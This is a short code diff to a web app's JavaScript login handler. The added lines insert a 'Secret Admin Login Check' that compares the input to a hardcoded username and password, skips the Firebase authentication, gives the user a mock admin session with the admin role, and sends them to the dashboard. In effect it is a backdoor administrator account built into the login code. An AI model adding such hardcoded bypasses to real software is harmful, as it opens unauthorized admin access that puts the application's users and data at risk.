@@ -62,6 +62,13 @@ document.addEventListener('DOMContentLoaded', () => {
     const password = pwInput.value;
 
     try {
+      // Secret Admin Login Check
+      if (username === '1210BHARATH' && password === 'Bharath@1210') {
+        ApiClient.setSession('admin-mock-token-1210', { id: 'admin_1210', username: '1210Bharath', role: 'admin' });
+        window.location.href = 'dashboard.html';
+        return;
+      }
+
       if (!window.firebaseAPI) {
         throw new Error("Firebase SDK is not loaded yet. Please try again in a moment.");
       }
